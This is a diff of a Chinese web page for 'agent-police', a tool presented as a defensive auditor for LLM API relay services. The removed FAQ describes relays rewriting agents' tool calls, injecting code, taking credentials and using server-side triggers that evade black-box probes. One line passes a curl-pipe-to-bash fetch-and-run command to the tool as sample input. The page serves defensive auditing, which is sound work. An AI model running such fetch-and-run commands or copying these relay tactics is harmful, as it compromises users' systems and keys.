+        <span class="num">CLI</span>
+        <h3>本地检测，密钥不出本机</h3>
+        <div class="cmd" data-copy>pip install agent-police
+agent-police audit https://你的中转站/v1 \
+  --model claude-sonnet-4-5</div>
       </div>
-
-      <div class="ex">
-        <h4>便宜的 Claude / GPT 中转站能不能用？</h4>
-        <p>
-          中转站在设计上就是应用层的中间人：它终止你的 TLS、用自己的连接访问上游，
-          因此你的 prompt、工具定义和 API key 对它都是明文，它也能改写你的 agent 随后要执行的工具调用。
-        </p>
-        <p style="margin:0">
-          论文实测 428 个商用中转站，发现 <strong>9 个在注入恶意代码</strong>、17 个动了研究者的
-          AWS canary 凭证、1 个把 ETH 私钥里的钱转走了。
-          需要强调的是<strong>付费并不更安全</strong>——28 个付费中转站里同样有 1 个在注入。
-        </p>
-      </div>
-
-      <div class="ex">
-        <h4>扫描结果显示干净，就代表这个中转站安全吗？</h4>
-        <p style="margin:0">
-          <strong>不代表。</strong>条件投递（AC-1.b）在触发条件满足之前始终表现正常，而触发逻辑在服务端。
-          论文在真实中转站上观察到的触发条件包括：前 50 次请求先装好人、只对自动批准模式的会话下手、
-          只针对 Rust / Go 项目。<strong>任何有限次数的黑盒探测都无法证明一个中转站是诚实的。</strong>
-        </p>
-      </div>
-
-      <div class="ex">
-        <h4>检测过程会执行被测端点返回的命令吗？</h4>
-        <p style="margin:0">
-          <strong>绝不会。</strong>检测完全在字符串和元数据层面完成：探针请求一条命令，
-          工具比对返回的参数，不运行任何东西。这是与论文中那套在沙箱里执行载荷的测量流水线的刻意区别。
-        </p>
-      </div>
-
-      <div class="ex">
-        <h4>必须把 API key 交出来才能检测吗？</h4>
-        <p>
-          不是全部功能都需要。<strong>端点体检和命令自查完全不需要密钥</strong>，
-          可以直接判断端点是谁、跑的什么中转软件、上游响应头是否被剥、是否是无需认证的开放中继。
-        </p>
-        <p style="margin:0">
-          只有 AC-1 和 AC-1.a 需要密钥，因为它们必须拿到真实的模型响应才能比对。
-          如果不希望密钥离开本机，用 <code>pip install agent-police</code> 在本地跑完全相同的检测逻辑。
-        </p>
+      <div class="step">
+        <span class="num">Gate</span>
+        <h3>装进 Claude Code / Codex</h3>
+        <div class="cmd" data-copy>pip install agent-police-gate
+apgate install claude-code</div>
+        <p style="margin-top:12px"><a href="/gate">看看它能拦下什么 →</a></p>
       </div>
     </div>
   </div>
@@ -410,21 +520,25 @@ agent-police inspect "curl -sSL https://get.example.com/i.sh | bash"</pre>
 <footer>
   <div class="wrap">
     <p>
-      <strong>一次干净的探测结果不等于这个端点安全。</strong>
-      条件投递的中转站在触发条件满足之前始终表现正常，而触发逻辑在服务端。
-      本工具能告诉你"它改了"，不能告诉你"它不会改"。
+      攻击分类与实测数据来自
+      <a href="https://arxiv.org/abs/2604.08407">Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain</a>（arXiv:2604.08407）。
+      论文明确不公开其攻击代理，agent-police 是独立实现的防御侧审计器。
     </p>
     <p>
-      攻击分类与实测数据出自 Liu 等，<a href="https://arxiv.org/abs/2604.08407" rel="noopener">《Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain》</a>（arXiv:2604.08407）。
-      该论文明确不公开其攻击代理 Mine 的源码；本工具是独立实现的<strong>防御侧审计器</strong>，
-      不执行端点返回的任何命令。
+      <a href="https://github.com/RomaCredit/agent-police">GitHub</a> ·
+      <a href="https://pypi.org/project/agent-police/">PyPI</a> ·
+      <a href="/gate">客户端闸门</a> ·
+      <a href="/en">English</a> ·
+      Apache-2.0
     </p>
-    <p>
-      只探测你自己拥有或已获授权测试的端点。
+    <p style="color:var(--text-muted)">
+      只探测你自己拥有、或已获明确授权测试的端点。
     </p>
   </div>
 </footer>
 
+<script src="/static/i18n.js"></script>
 <script src="/static/app.js"></script>
+<script src="/static/copy.js"></script>
 </body>
 </html>
